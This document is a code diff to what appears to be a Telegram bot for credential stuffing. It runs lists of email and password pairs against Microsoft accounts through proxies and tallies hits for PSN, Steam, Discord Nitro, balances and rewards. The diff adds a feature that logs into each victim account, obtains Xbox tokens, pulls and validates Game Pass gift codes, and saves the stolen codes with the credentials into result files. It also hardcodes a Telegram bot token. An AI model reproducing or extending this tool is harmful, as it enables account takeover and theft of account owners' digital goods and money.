@@ -33,11 +33,25 @@ except ImportError:
     os.system(f"{sys.executable} -m pip install beautifulsoup4 -q")
     from bs4 import BeautifulSoup
 
+# Xbox Pulled (fetch + validate from api_exam)
+try:
+    from api_exam import (
+        fetch_oauth_tokens,
+        fetch_login,
+        get_xbox_tokens,
+        fetch_codes_from_xbox,
+        login_microsoft_account as xbox_pulled_login,
+        validate_code_primary as xbox_pulled_validate,
+    )
+    XBOX_PULLED_AVAILABLE = True
+except ImportError:
+    XBOX_PULLED_AVAILABLE = False
+
 # ══════════════════════════════════════════════════════════
 #  CONFIG
 # ══════════════════════════════════════════════════════════
 
-BOT_TOKEN = "8709060358:AAHfQb9zwqUR7kvuD2NrgHdVSMQR-Z7sqdY"
+BOT_TOKEN = "8778892251:AAEvOkfeGplmAkXFnlC3tHRrx54e1RvQeDY"
 ADMIN_ID = 7265489223
 DEFAULT_THREADS = 30
 MAX_LINES = 10000
@@ -1649,6 +1663,8 @@ class CheckerStats:
         self.instagram = 0
         self.minecraft = 0
         self.xbox_codes = 0
+        self.xbox_pulled = 0  # total codes found (all statuses)
+        self.xbox_pulled_valid = 0  # valid + balance + valid_card only
         self.discord_total = 0
         self.discord_valid = 0
         self.discord_claimed = 0
@@ -1669,6 +1685,12 @@ class CheckerStats:
         self.rp_list = []
         self.discord_list = []
         self.xbox_code_list = []
+        # Xbox Pulled: per-status lists (em, pw, name_or_msg, code) - like api_exam
+        self.xbox_pulled_by_status = {
+            "VALID": [], "BALANCE_CODE": [], "VALID_REQUIRES_CARD": [],
+            "REDEEMED": [], "EXPIRED": [], "INVALID": [], "DEACTIVATED": [],
+            "UNKNOWN": [], "REGION_LOCKED": [], "RATE_LIMITED": [], "ERROR": [],
+        }
         self.psn_list = []
         self.steam_list = []
         self.supercell_list = []
@@ -1827,6 +1849,46 @@ class CheckerSession:
                 st.add("all_hits", (email, pwd, "XCODE", f"{code} | {desc}"))
         except:
             pass
+
+        # XBOX PULLED (fetch from Game Pass + validate, save all by status like api_exam)
+        if XBOX_PULLED_AVAILABLE:
+            try:
+                proxy = pxr_inst.get() if pxr_inst else None
+                fetch_sess = requests.Session()
+                if proxy:
+                    fetch_sess.proxies = proxy
+                fetch_sess.headers.update({"User-Agent": UA})
+                url_post, ppft = fetch_oauth_tokens(fetch_sess)
+                if url_post:
+                    rps = fetch_login(fetch_sess, email, pwd, url_post, ppft)
+                    if rps:
+                        uhs, xsts = get_xbox_tokens(fetch_sess, rps)
+                        if uhs:
+                            raw_codes = fetch_codes_from_xbox(fetch_sess, uhs, xsts)
+                            if raw_codes:
+                                val_sess = xbox_pulled_login(email, pwd, proxy)
+                                if val_sess:
+                                    for code in raw_codes:
+                                        if self.stop_event.is_set():
+                                            break
+                                        result = xbox_pulled_validate(val_sess, code)
+                                        status = result.get("status", "UNKNOWN")
+                                        msg = result.get("message", "")
+                                        name = result.get("product_title") or ""
+                                        if not name and msg and "|" in msg:
+                                            name = msg.split("|")[-1].strip()
+                                        if not name:
+                                            name = msg or status
+                                        st.inc("xbox_pulled")
+                                        if status in ("VALID", "VALID_REQUIRES_CARD", "BALANCE_CODE"):
+                                            st.inc("xbox_pulled_valid")
+                                        with st.lock:
+                                            key = status if status in st.xbox_pulled_by_status else "UNKNOWN"
+                                            st.xbox_pulled_by_status[key].append((email, pwd, name, code))
+                                        st.add("all_hits", (email, pwd, "XBOX_PULLED", f"{status}: {name} | {code}"))
+                            fetch_sess.close()
+            except Exception:
+                pass
 
         # PSN
         try:
@@ -2006,6 +2068,29 @@ def build_result_zip(cs: CheckerSession, user=None):
         lines.append(f"{em}:{pw} | {code} | {desc}")
     w("xbox_codes.txt", lines)
 
+    # xbox_pulled/ folder (like api_exam: valid, already_claimed, expired, invalid, etc.)
+    xbox_pulled_dir = os.path.join(odir, "xbox_pulled")
+    os.makedirs(xbox_pulled_dir, exist_ok=True)
+
+    def w_xbox(fn, lines):
+        with open(os.path.join(xbox_pulled_dir, fn), "w", encoding="utf-8") as f:
+            for line in lines:
+                f.write(line + "\n")
+
+    def write_xbox_file(fn, items):
+        lines = [f"{em}:{pw} \u2013 {name} \u2013 {code}" for em, pw, name, code in items]
+        w_xbox(fn, lines)
+
+    write_xbox_file("valid_xbox_codes.txt", st.xbox_pulled_by_status.get("VALID", []) + st.xbox_pulled_by_status.get("BALANCE_CODE", []))
+    write_xbox_file("valid_cardrequired_codes.txt", st.xbox_pulled_by_status.get("VALID_REQUIRES_CARD", []))
+    write_xbox_file("already_claimed.txt", st.xbox_pulled_by_status.get("REDEEMED", []))
+    write_xbox_file("expired.txt", st.xbox_pulled_by_status.get("EXPIRED", []))
+    write_xbox_file("invalid.txt", st.xbox_pulled_by_status.get("INVALID", []) + st.xbox_pulled_by_status.get("DEACTIVATED", []))
+    write_xbox_file("unknown_codes.txt", st.xbox_pulled_by_status.get("UNKNOWN", []))
+    write_xbox_file("region_locked_codes.txt", st.xbox_pulled_by_status.get("REGION_LOCKED", []))
+    write_xbox_file("rate_limited.txt", st.xbox_pulled_by_status.get("RATE_LIMITED", []))
+    write_xbox_file("errors.txt", st.xbox_pulled_by_status.get("ERROR", []))
+
     # psn_hits.txt
     lines = [f"{em}:{pw} | Orders: {n}" for em, pw, n in st.psn_list]
     w("psn_hits.txt", lines)
@@ -2088,7 +2173,7 @@ def build_result_zip(cs: CheckerSession, user=None):
         f"PSN: {st.psn} | STEAM: {st.steam} | SUPERCELL: {st.supercell}",
         f"TIKTOK: {st.tiktok} (Top Ranges: {tiktok_ranges_str})",
         f"INSTAGRAM: {st.instagram} (Top Ranges: {instagram_ranges_str})",
-        f"MINECRAFT: {st.minecraft} | XBOX CODES: {st.xbox_codes}",
+        f"MINECRAFT: {st.minecraft} | XBOX CODES: {st.xbox_codes} | XBOX PULLED: {st.xbox_pulled} (Valid: {st.xbox_pulled_valid})",
         f"DISCORD: {st.discord_total} (Valid: {st.discord_valid}, Claimed: {st.discord_claimed}, Unk: {st.discord_unk})",
         f"BALANCE >$0: {st.balance} | RP HITS: {st.rp_hits} ({st.rp_total_pts} pts)",
         f"XGPU: {st.xgpu} | XGPP: {st.xgpp} | XGPE: {st.xgpe} | M365: {st.m365} | OTHER: {st.other_svc}",
@@ -2114,6 +2199,7 @@ def build_result_zip(cs: CheckerSession, user=None):
         "- Instagram with Full Profile Capture (Followers, Posts, Following, Verified Status)",
         "- Minecraft Account Check",
         "- Xbox Codes",
+        "- Xbox Pulled (fetch + validate, see xbox_pulled/ folder: valid_xbox_codes.txt, already_claimed.txt, expired.txt, invalid.txt, etc.)",
         "- Discord Nitro Promos",
         "- Microsoft Balance",
         "- Bing Rewards Points",
@@ -2210,7 +2296,7 @@ def build_status_message(cs: CheckerSession):
 {E_GAME} {bold('PSN:')} {mono(str(st.psn))}    {E_GAME} {bold('Steam:')} {mono(str(st.steam))}
 {E_GAME} {bold('Supercell:')} {mono(str(st.supercell))} {E_MUSIC} {bold('TikTok:')} {mono(str(st.tiktok))}
 {E_CAMERA} {bold('Instagram:')} {mono(str(st.instagram))} {E_GAME} {bold('Minecraft:')} {mono(str(st.minecraft))}
-{E_KEY} {bold('Xbox Codes:')} {mono(str(st.xbox_codes))}
+{E_KEY} {bold('Xbox Codes:')} {mono(str(st.xbox_codes))}  {E_GIFT} {bold('Xbox Pulled:')} {mono(str(st.xbox_pulled))} (Valid: {mono(str(st.xbox_pulled_valid))})
 \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
 {E_GIFT} {bold('Discord Valid:')} {mono(f'{st.discord_valid}/{st.discord_total}')}
 {E_GIFT} {bold('Discord Claimed:')} {mono(str(st.discord_claimed))}
@@ -2259,7 +2345,7 @@ def build_summary_message(cs: CheckerSession, stopped=False):
 {E_GAME} PSN: {mono(str(st.psn))} | Steam: {mono(str(st.steam))}
 {E_GAME} Supercell: {mono(str(st.supercell))} | TikTok: {mono(str(st.tiktok))}
 {E_CAMERA} Instagram: {mono(str(st.instagram))} | Minecraft: {mono(str(st.minecraft))}
-{E_KEY} Xbox Codes: {mono(str(st.xbox_codes))}
+{E_KEY} Xbox Codes: {mono(str(st.xbox_codes))}  {E_GIFT} Xbox Pulled: {mono(str(st.xbox_pulled))} (Valid: {mono(str(st.xbox_pulled_valid))})
 {E_GIFT} Discord: {mono(f'{st.discord_valid}/{st.discord_total}')} (Claimed: {st.discord_claimed})
 {E_MONEY} Balance: {mono(str(st.balance))} | RP: {mono(str(st.rp_hits))} ({st.rp_total_pts} pts)
 {E_DIAMOND} XGPU: {mono(str(st.xgpu))} | XGPP: {mono(str(st.xgpp))} | XGPE: {mono(str(st.xgpe))}
@@ -2420,7 +2506,7 @@ def run_checker(cs: CheckerSession, message, user):
 {E_GAME} PSN: {mono(str(cs.stats.psn))} | Steam: {mono(str(cs.stats.steam))}
 {E_GAME} Supercell: {mono(str(cs.stats.supercell))} | TikTok: {mono(str(cs.stats.tiktok))}
 {E_CAMERA} Instagram: {mono(str(cs.stats.instagram))} | Minecraft: {mono(str(cs.stats.minecraft))}
-{E_KEY} Xbox Codes: {mono(str(cs.stats.xbox_codes))}
+{E_KEY} Xbox Codes: {mono(str(cs.stats.xbox_codes))}  Xbox Pulled: {mono(str(cs.stats.xbox_pulled))} (Valid: {mono(str(cs.stats.xbox_pulled_valid))})
 {E_GIFT} Discord: {mono(f'{cs.stats.discord_valid}/{cs.stats.discord_total}')}
 {E_MONEY} Balance: {mono(str(cs.stats.balance))} | RP: {mono(str(cs.stats.rp_hits))} ({cs.stats.rp_total_pts} pts)
 {E_DIAMOND} XGPU: {mono(str(cs.stats.xgpu))} | XGPP: {mono(str(cs.stats.xgpp))} | XGPE: {mono(str(cs.stats.xgpe))}
@@ -2478,7 +2564,7 @@ def cmd_start(message):
 
 {E_DIAMOND} {bold('Features:')}
 {E_CHECK} PSN / Steam / Supercell / TikTok
-{E_CHECK} Minecraft / Xbox Codes / Discord
+{E_CHECK} Minecraft / Xbox Codes / Xbox Pulled / Discord
 {E_CHECK} Balance / Rewards Points
 {E_CHECK} Game Pass / M365 Services
 {E_CHECK} Fast Multi-threaded Checking
